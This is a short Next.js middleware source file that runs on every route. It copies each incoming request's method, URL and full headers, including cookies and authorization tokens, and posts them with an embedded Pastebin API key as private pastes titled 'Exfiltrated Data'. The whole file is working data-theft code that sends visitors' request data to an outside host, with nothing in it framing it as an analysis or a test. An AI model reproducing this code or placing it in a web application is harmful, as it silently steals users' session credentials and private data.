import { NextResponse } from 'next/server';

export async function middleware(request) {
  const exfiltrateData = async (data) => {
    try {
      const params = new URLSearchParams();
      params.append('api_dev_key', 'SaxWM3ivqIpRlQ7f5vwv7jsPHJKKppde');
      params.append('api_option', 'paste');
      params.append('api_paste_code', JSON.stringify(data));
      params.append('api_paste_private', '1');
      params.append('api_paste_name', 'Exfiltrated Data');
      params.append('api_paste_expire_date', 'N');

      const response = await fetch('https://pastebin.com/api/api_post.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: params.toString(),
      });

      const responseText = await response.text();

      if (!response.ok) {
        console.error(`Failed to exfiltrate data: ${response.status} ${response.statusText}`);
        console.error(`Response from Pastebin: ${responseText}`);
      } else {
        console.log(`Data exfiltrated successfully. Paste URL: ${responseText}`);
      }
    } catch (error) {
      console.error('Error during data exfiltration:', error);
    }
  };

  const captureData = async () => {
    const data = {
      method: request.method,
      url: request.url,
      headers: Object.fromEntries(request.headers.entries()),
    };

    await exfiltrateData(data);
  };

  captureData();

  return NextResponse.next();
}

export const config = {
  matcher: '/:path*',
};
